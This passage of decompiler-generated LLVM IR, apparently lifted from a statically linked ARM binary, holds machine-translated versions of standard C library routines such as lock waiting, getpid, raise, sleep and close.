  uselistorder label %dec_label_pc_144ec, { 1, 0 }
  uselistorder label %dec_label_pc_14498, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14480, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_14424, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1440c, { 1, 0 }
  uselistorder label %dec_label_pc_144a8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_143d8, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14784 = load i32, i32* @r4, align 4
  store i32 %v3_14784, i32* %stack_var_-16, align 4
  %v0_14788 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14788, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %dec_label_pc_1480c.dec_label_pc_1478c_crit_edge, %entry
  %v0_14790 = phi i32 [ %v0_14790.pre, %dec_label_pc_1480c.dec_label_pc_1478c_crit_edge ], [ %v0_14788, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_14790, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_1479817 = inttoptr i32 %v0_14790 to i32*
  %v2_1479818 = load i32, i32* %v1_1479817, align 4
  %v3_1479c20 = icmp ne i32 %v2_1479818, 0
  store i1 %v3_1479c20, i1* %cpsr_c.global-to-local, align 1
  %v9_1479c26 = icmp eq i32 %v2_1479818, 1
  br i1 %v9_1479c26, label %dec_label_pc_147a4, label %dec_label_pc_147bc

dec_label_pc_147a4:                               ; preds = %dec_label_pc_1478c, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge
  %v0_147a427 = phi i32 [ %v1_1479c.pre, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge ], [ 1, %dec_label_pc_1478c ]
  store i32 %v0_147a427, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_147b4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_147b4, label %dec_label_pc_147b8, label %dec_label_pc_147a4.dec_label_pc_14798_crit_edge

dec_label_pc_147a4.dec_label_pc_14798_crit_edge:  ; preds = %dec_label_pc_147a4
  %v0_14798.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1479c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14798 = inttoptr i32 %v0_14798.pre to i32*
  %v2_14798 = load i32, i32* %v1_14798, align 4
  %v3_1479c = icmp uge i32 %v2_14798, %v1_1479c.pre
  store i1 %v3_1479c, i1* %cpsr_c.global-to-local, align 1
  %v9_1479c = icmp eq i32 %v2_14798, %v1_1479c.pre
  br i1 %v9_1479c, label %dec_label_pc_147a4, label %dec_label_pc_147bc

dec_label_pc_147b8:                               ; preds = %dec_label_pc_147a4
  %v0_147b8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %dec_label_pc_1478c, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge, %dec_label_pc_147b8
  %v0_147bc = phi i32 [ %v0_147b8, %dec_label_pc_147b8 ], [ %v2_1479818, %dec_label_pc_1478c ], [ %v2_14798, %dec_label_pc_147a4.dec_label_pc_14798_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_147bc = icmp eq i32 %v0_147bc, 0
  %v0_147e0.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_147bc, label %dec_label_pc_147dc, label %dec_label_pc_147c4

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147bc
  store i32 %v0_147e0.pre, i32* %r0.global-to-local, align 4
  %v0_147c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_147c8 = add i32 %v0_147c8, 126
  store i32 %v1_147c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_147bc, %dec_label_pc_147c4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_147e0.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_147e828 = inttoptr i32 %v0_147e0.pre to i32*
  %v2_147e829 = load i32, i32* %v1_147e828, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_147ec36 = icmp eq i32 %v2_147e829, 0
  br i1 %v9_147ec36, label %dec_label_pc_147f4, label %dec_label_pc_1480c

dec_label_pc_147f4:                               ; preds = %dec_label_pc_147dc, %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge
  %v0_147f437 = phi i32 [ %v1_147ec.pre, %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge ], [ 0, %dec_label_pc_147dc ]
  store i32 %v0_147f437, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14804 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14804, label %dec_label_pc_14808, label %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge

dec_label_pc_147f4.dec_label_pc_147e8_crit_edge:  ; preds = %dec_label_pc_147f4
  %v0_147e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_147ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_147e8 = inttoptr i32 %v0_147e8.pre to i32*
  %v2_147e8 = load i32, i32* %v1_147e8, align 4
  %v3_147ec = icmp uge i32 %v2_147e8, %v1_147ec.pre
  store i1 %v3_147ec, i1* %cpsr_c.global-to-local, align 1
  %v9_147ec = icmp eq i32 %v2_147e8, %v1_147ec.pre
  br i1 %v9_147ec, label %dec_label_pc_147f4, label %dec_label_pc_1480c

dec_label_pc_14808:                               ; preds = %dec_label_pc_147f4
  %v0_14808 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %dec_label_pc_147dc, %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge, %dec_label_pc_14808
  %v0_1480c = phi i32 [ %v0_14808, %dec_label_pc_14808 ], [ %v2_147e829, %dec_label_pc_147dc ], [ %v2_147e8, %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge ]
  %v1_1480c = phi i32 [ %v0_14808, %dec_label_pc_14808 ], [ 0, %dec_label_pc_147dc ], [ %v1_147ec.pre, %dec_label_pc_147f4.dec_label_pc_147e8_crit_edge ]
  %v3_1480c = icmp uge i32 %v0_1480c, %v1_1480c
  store i1 %v3_1480c, i1* %cpsr_c.global-to-local, align 1
  %v9_1480c = icmp eq i32 %v0_1480c, %v1_1480c
  br i1 %v9_1480c, label %dec_label_pc_14814, label %dec_label_pc_1480c.dec_label_pc_1478c_crit_edge

dec_label_pc_1480c.dec_label_pc_1478c_crit_edge:  ; preds = %dec_label_pc_1480c
  %v0_14790.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1478c

dec_label_pc_14814:                               ; preds = %dec_label_pc_1480c
  %v2_14814 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14814, i32* %r4.global-to-local, align 4
  %v1_14818 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14818

; uselistorder directives
  uselistorder i32 %v0_14808, { 1, 0 }
  uselistorder i32 %v1_147ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1479c.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1479818, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1480c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147f4, { 1, 0 }
  uselistorder label %dec_label_pc_147dc, { 1, 0 }
  uselistorder label %dec_label_pc_147bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_147a4, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1481c = load i32, i32* @r7, align 4
  store i32 %v3_1481c, i32* %stack_var_-8, align 4
  %v0_14820 = call i32 @__aeabi_read_tp()
  store i32 %v0_14820, i32* %r0.global-to-local, align 4
  %v1_14824 = add i32 %v0_14820, -1060
  %v2_14824 = inttoptr i32 %v1_14824 to i32*
  %v3_14824 = load i32, i32* %v2_14824, align 4
  %tmp7 = icmp slt i32 %v3_14824, 1
  br i1 %tmp7, label %dec_label_pc_14834, label %dec_label_pc_14858

dec_label_pc_14834:                               ; preds = %entry
  %v2_14828 = icmp eq i32 %v3_14824, 0
  br i1 %v2_14828, label %dec_label_pc_14838, label %dec_label_pc_14844

dec_label_pc_14838:                               ; preds = %dec_label_pc_14834
  %v1_14838 = add i32 %v0_14820, -1064
  %v2_14838 = inttoptr i32 %v1_14838 to i32*
  %v3_14838 = load i32, i32* %v2_14838, align 4
  store i32 %v3_14838, i32* %r0.global-to-local, align 4
  %v2_1483c = icmp eq i32 %v3_14838, 0
  br i1 %v2_1483c, label %bb, label %bb8

dec_label_pc_14844:                               ; preds = %dec_label_pc_14834
  br label %bb8

bb:                                               ; preds = %dec_label_pc_14838
  store i32 0, i32* %v2_14838, align 4
  %v0_14854.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_14844, %dec_label_pc_14838, %bb
  %v0_14854 = phi i32 [ %v3_14838, %dec_label_pc_14838 ], [ %v0_14820, %dec_label_pc_14844 ], [ %v0_14854.pre, %bb ]
  br label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %entry, %bb8
  %v0_14858 = phi i32 [ %v3_14824, %entry ], [ %v0_14854, %bb8 ]
  store i32 %v0_14858, i32* %r0.global-to-local, align 4
  %v2_1485c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1485c, i32* @r7, align 4
  ret i32 %v0_14858

; uselistorder directives
  uselistorder i32 %v0_14858, { 1, 0 }
  uselistorder i32 %v3_14824, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14858, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14864 = load i32, i32* @r4, align 4
  store i32 %v3_14864, i32* %stack_var_-20, align 4
  %v0_1486c = call i32 @__aeabi_read_tp()
  store i32 %v0_1486c, i32* %r0.global-to-local, align 4
  %v1_14870 = add i32 %v0_1486c, -1064
  %v2_14870 = inttoptr i32 %v1_14870 to i32*
  %v3_14870 = load i32, i32* %v2_14870, align 4
  store i32 %v3_14870, i32* %r4.global-to-local, align 4
  %v2_14874 = icmp eq i32 %v3_14870, 0
  %v1_1487c = add i32 %v0_1486c, -1060
  %v2_1487c = inttoptr i32 %v1_1487c to i32*
  %v3_1487c = load i32, i32* %v2_1487c, align 4
  store i32 %v3_1487c, i32* %r0.global-to-local, align 4
  br i1 %v2_14874, label %dec_label_pc_14884, label %dec_label_pc_14898

dec_label_pc_14884:                               ; preds = %entry
  store i32 %v3_1487c, i32* %r4.global-to-local, align 4
  store i32 %v3_1487c, i32* %v2_14870, align 4
  %v0_148c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_14898:                               ; preds = %entry
  %v5_1489c = icmp sgt i32 %v3_1487c, 0
  br i1 %v5_1489c, label %bb28, label %dec_label_pc_148a0

dec_label_pc_148a0:                               ; preds = %dec_label_pc_14898
  %tmp = bitcast i32 %v3_1487c to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_148a0 = bitcast float %tmp30 to i32
  %v2_148a4 = icmp eq i32 %v1_148a0, 0
  br i1 %v2_148a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_148a0
  store i32 %v3_14870, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_148a0
  %v2_148ac = sub i32 0, %v3_1487c
  store i32 %v2_148ac, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_14898, %dec_label_pc_14884, %.thread
  %v0_148c4 = phi i32 [ %v3_1487c, %dec_label_pc_14898 ], [ %v0_148c0.pre, %dec_label_pc_14884 ], [ %v3_14870, %bb ], [ %v2_148ac, %.thread ]
  store i32 %v0_148c4, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_148c4, -4095
  br i1 %tmp31, label %dec_label_pc_148e8, label %dec_label_pc_148d0

dec_label_pc_148d0:                               ; preds = %bb28
  %v0_148d4 = call i32 @__aeabi_read_tp()
  %v3_148d8 = load i16, i16* @global_var_2229c.359, align 2
  %v4_148d8 = sext i16 %v3_148d8 to i32
  %v0_148dc = load i32, i32* %r2.global-to-local, align 4
  %v1_148dc = sub i32 0, %v0_148dc
  store i32 %v1_148dc, i32* %r2.global-to-local, align 4
  %v3_148e0 = add i32 %v4_148d8, %v0_148d4
  %v4_148e0 = inttoptr i32 %v3_148e0 to i32*
  store i32 %v1_148dc, i32* %v4_148e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %bb28, %dec_label_pc_148d0
  %v0_148ec = phi i32 [ %v0_148c4, %bb28 ], [ -1, %dec_label_pc_148d0 ]
  %v3_148e8 = icmp eq i32 %v0_148ec, -1
  store i32 %v0_148ec, i32* %r5.global-to-local, align 4
  br i1 %v3_148e8, label %dec_label_pc_148f4, label %dec_label_pc_1493c

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148e8
  %v0_148f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_148f8, i32* %r0.global-to-local, align 4
  %v3_148fc = load i16, i16* @global_var_2229c.359, align 2
  %v4_148fc = sext i16 %v3_148fc to i32
  %v2_14900 = add i32 %v4_148fc, %v0_148f8
  %v3_14900 = inttoptr i32 %v2_14900 to i32*
  %v4_14900 = load i32, i32* %v3_14900, align 4
  %v7_14904 = icmp eq i32 %v4_14900, 38
  br i1 %v7_14904, label %dec_label_pc_14910, label %dec_label_pc_148f4.dec_label_pc_1493c_crit_edge

dec_label_pc_148f4.dec_label_pc_1493c_crit_edge:  ; preds = %dec_label_pc_148f4
  %v0_1493c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1493c

dec_label_pc_14910:                               ; preds = %dec_label_pc_148f4
  %v0_14910 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14910, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_14910, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_14910
  %v5_14928 = sub i32 0, %v0_14910
  store i32 %v5_14928, i32* %r2.global-to-local, align 4
  %v7_1492c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_14934.539 to i32), i32 55656) to i32*), align 4
  %v4_14930 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_14930, i32* %r0.global-to-local, align 4
  %v7_14934 = add i32 %v7_1492c, %v0_148f8
  %v8_14934 = inttoptr i32 %v7_14934 to i32*
  store i32 %v5_14928, i32* %v8_14934, align 4
  %v0_14938.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_14910, %bb29
  %v0_14938 = phi i32 [ %v0_14938.pre, %bb29 ], [ %v0_14910, %dec_label_pc_14910 ]
  store i32 %v0_14938, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1493c

dec_label_pc_1493c:                               ; preds = %dec_label_pc_148f4.dec_label_pc_1493c_crit_edge, %dec_label_pc_148e8, %.thread22
  %v0_1493c = phi i32 [ %v0_1493c.pre, %dec_label_pc_148f4.dec_label_pc_1493c_crit_edge ], [ %v0_148ec, %dec_label_pc_148e8 ], [ %v0_14938, %.thread22 ]
  store i32 %v0_1493c, i32* %r0.global-to-local, align 4
  %v2_14940 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14940, i32* @r4, align 4
  ret i32 %v0_1493c

; uselistorder directives
  uselistorder i32 %v0_1493c, { 1, 0 }
  uselistorder i32 %v0_14910, { 1, 2, 0, 3 }
  uselistorder i32 %v0_148c4, { 2, 0, 1 }
  uselistorder i32 %v3_1487c, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_1493c, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_148e8, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_14954 = load i32, i32* @r4, align 4
  %v6_14954 = load i32, i32* @r5, align 4
  %v9_14954 = load i32, i32* @r6, align 4
  %v12_14954 = load i32, i32* @r7, align 4
  %v15_14954 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14964 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_14964, label %dec_label_pc_14978, label %dec_label_pc_149ec

dec_label_pc_14978:                               ; preds = %entry
  %v0_14978 = call i32 @__aeabi_read_tp()
  %v1_1497c = add i32 %v0_14978, -1036
  %v2_1497c = inttoptr i32 %v1_1497c to i32*
  %v3_1497c = load i32, i32* %v2_1497c, align 4
  %v1_14980 = and i32 %v3_1497c, -71
  %v2_14984 = icmp ugt i32 %v1_14980, 7
  store i1 %v2_14984, i1* %cpsr_c.global-to-local, align 1
  %v7_14984 = icmp eq i32 %v1_14980, 8
  %v1_14988 = add i32 %v0_14978, -1168
  store i32 %v1_14988, i32* @r5, align 4
  br i1 %v7_14984, label %dec_label_pc_14990, label %dec_label_pc_14a64

dec_label_pc_14990:                               ; preds = %dec_label_pc_14978
  %v2_14994 = add i32 %v0_14978, -624
  %v3_14994 = inttoptr i32 %v2_14994 to i32*
  store i32 -1, i32* %v3_14994, align 4
  %v0_14998 = load i32, i32* @r5, align 4
  %v1_14998 = add i32 %v0_14998, 132
  store i32 %v1_14998, i32* @r6, align 4
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %dec_label_pc_149d0.dec_label_pc_1499c_crit_edge, %dec_label_pc_14990
  %v0_149a0 = phi i32 [ %v0_149a0.pre, %dec_label_pc_149d0.dec_label_pc_1499c_crit_edge ], [ %v1_14998, %dec_label_pc_14990 ]
  %v0_1499c = phi i32 [ %v0_149d8, %dec_label_pc_149d0.dec_label_pc_1499c_crit_edge ], [ %v0_14998, %dec_label_pc_14990 ]
  %v1_1499c = add i32 %v0_1499c, 132
  %v2_1499c = inttoptr i32 %v1_1499c to i32*
  %v3_1499c = load i32, i32* %v2_1499c, align 4
  store i32 %v0_149a0, i32* %r2.global-to-local, align 4
  store i32 %v3_1499c, i32* @r4, align 4
  %v1_149ac30 = inttoptr i32 %v0_149a0 to i32*
  %v2_149ac31 = load i32, i32* %v1_149ac30, align 4
  %v3_149b033 = icmp uge i32 %v2_149ac31, %v3_1499c
  store i1 %v3_149b033, i1* %cpsr_c.global-to-local, align 1
  %v9_149b039 = icmp eq i32 %v2_149ac31, %v3_1499c
  br i1 %v9_149b039, label %dec_label_pc_149b8, label %dec_label_pc_149d0

dec_label_pc_149b8:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b8.dec_label_pc_149ac_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_149c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_149c8, label %dec_label_pc_149cc, label %dec_label_pc_149b8.dec_label_pc_149ac_crit_edge

dec_label_pc_149b8.dec_label_pc_149ac_crit_edge:  ; preds = %dec_label_pc_149b8
  %v0_149ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_149b0.pre = load i32, i32* @r4, align 4
  %v1_149ac = inttoptr i32 %v0_149ac.pre to i32*
  %v2_149ac = load i32, i32* %v1_149ac, align 4
  %v3_149b0 = icmp uge i32 %v2_149ac, %v1_149b0.pre
  store i1 %v3_149b0, i1* %cpsr_c.global-to-local, align 1
  %v9_149b0 = icmp eq i32 %v2_149ac, %v1_149b0.pre
  br i1 %v9_149b0, label %dec_label_pc_149b8, label %dec_label_pc_149d0

dec_label_pc_149cc:                               ; preds = %dec_label_pc_149b8
  %v0_149cc = load i32, i32* @r4, align 4
  br label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_1499c, %dec_label_pc_149b8.dec_label_pc_149ac_crit_edge, %dec_label_pc_149cc
  %v0_149d0 = phi i32 [ %v0_149cc, %dec_label_pc_149cc ], [ %v2_149ac31, %dec_label_pc_1499c ], [ %v2_149ac, %dec_label_pc_149b8.dec_label_pc_149ac_crit_edge ]
  %v1_149d0 = phi i32 [ %v0_149cc, %dec_label_pc_149cc ], [ %v3_1499c, %dec_label_pc_1499c ], [ %v1_149b0.pre, %dec_label_pc_149b8.dec_label_pc_149ac_crit_edge ]
  %v3_149d0 = icmp uge i32 %v0_149d0, %v1_149d0
  store i1 %v3_149d0, i1* %cpsr_c.global-to-local, align 1
  %v9_149d0 = icmp eq i32 %v0_149d0, %v1_149d0
  br i1 %v9_149d0, label %dec_label_pc_149d8, label %dec_label_pc_149d0.dec_label_pc_1499c_crit_edge

dec_label_pc_149d0.dec_label_pc_1499c_crit_edge:  ; preds = %dec_label_pc_149d0
  %v0_149d8 = load i32, i32* @r5, align 4
  %v0_149a0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1499c

dec_label_pc_149d8:                               ; preds = %dec_label_pc_149d0
  %v0_149e0 = load i32, i32* @r7, align 4
  %v2_149e0 = add i32 %v0_149e0, 116
  %v3_149e0 = inttoptr i32 %v2_149e0 to i32*
  %v4_149e0 = load i32, i32* %v3_149e0, align 4
  store i32 84460, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149e0)
  %v0_149f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_149ec

dec_label_pc_149ec:                               ; preds = %entry, %dec_label_pc_149d8
  %v0_149f4 = phi i32 [ 0, %entry ], [ %v0_149f4.pre, %dec_label_pc_149d8 ]
  %v2_149f8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_149f8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %stack_var_-40, align 4
  %v3_14a04 = call i32 @__libc_sigaction(i32 17, i32 %v0_149f4, i32 %v2_149f8)
  %v3_14a08 = load i32, i32* %stack_var_-60, align 4
  %v2_14a0c = icmp ne i32 %v3_14a08, 0
  store i1 %v2_14a0c, i1* %cpsr_c.global-to-local, align 1
  %v7_14a0c = icmp eq i32 %v3_14a08, 1
  br i1 %v7_14a0c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_149ec
  %v3_14a10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a10, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_149ec, %bb
  call void @__pseudo_cond_branch(i1 %v7_14a0c, i32 ptrtoint (i32* @global_var_11670.543 to i32))
  %v2_14a20 = ptrtoint i32* %stack_var_-32 to i32
  %v2_14a28 = call i32 @__libc_nanosleep(i32 %v2_14a20, i32 %v2_14a20)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14a2c = icmp eq i32 %v2_14a28, 0
  br i1 %v2_14a2c, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14a40 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14a40, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14a50 = load i32, i32* %stack_var_-40, align 4
  %v1_14a54 = and i32 %v3_14a50, ptrtoint (i32* @global_var_10000.57 to i32)
  store i32 %v1_14a54, i32* %r2.global-to-local, align 4
  %v2_14a54 = icmp eq i32 %v1_14a54, 0
  br i1 %v2_14a54, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_14a5c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14a5c, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_14a54, i32 ptrtoint (i32* @global_var_11670.543 to i32))
  br label %dec_label_pc_14a64

dec_label_pc_14a64:                               ; preds = %dec_label_pc_14978, %.thread5
  %v0_14a64 = load i32, i32* @r4, align 4
  store i32 %v3_14954, i32* @r4, align 4
  store i32 %v6_14954, i32* @r5, align 4
  store i32 %v9_14954, i32* @r6, align 4
  store i32 %v12_14954, i32* @r7, align 4
  store i32 %v15_14954, i32* @lr, align 4
  ret i32 %v0_14a64

; uselistorder directives
  uselistorder i32 %v0_149cc, { 1, 0 }
  uselistorder i32 %v1_149b0.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.57 to i32), { 4, 0, 1, 2, 5, 6, 7, 8, 3 }
  uselistorder label %dec_label_pc_14a64, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_149ec, { 1, 0 }
  uselistorder label %dec_label_pc_149d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_149b8, { 1, 0 }
}

define i32 @function_14a78(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14a78:
  %r0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_14a78 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a78, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14a78
  %tmp2 = inttoptr i32 %arg2 to i16*
  %v2_14a78 = load i32, i32* @r4, align 4
  %v4_14a78 = lshr i32 %v2_14a78, %tmp
  %v5_14a78 = sub nsw i32 32, %tmp
  %v6_14a78 = shl i32 %v2_14a78, %v5_14a78
  %v7_14a78 = or i32 %v6_14a78, %v4_14a78
  %v9_14a78 = and i32 %v7_14a78, %tmp
  store i32 %v9_14a78, i32* %r0.global-to-local, align 4
  %v2_14a80 = trunc i32 %v9_14a78 to i16
  store i16 %v2_14a80, i16* %tmp2, align 2
  %v6_14a80 = load i32, i32* %r0.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14a78, %bb
  %v10_14a80 = phi i32 [ %tmp, %dec_label_pc_14a78 ], [ %v6_14a80, %bb ]
  ret i32 %v10_14a80

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_14a94 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14a94, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14a94 = load i32, i32* @r0, align 4
  ret i32 %v2_14a94

bb1:                                              ; preds = %entry
  %v0_14a98 = call i32 @__syscall_error()
  ret i32 %v0_14a98
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14aa4 = load i32, i32* @global_var_2545c.546, align 4
  %v2_14aa8 = icmp eq i32 %v3_14aa4, 0
  store i1 %v2_14aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14aa8, label %dec_label_pc_14ab0, label %entry.dec_label_pc_14acc_crit_edge

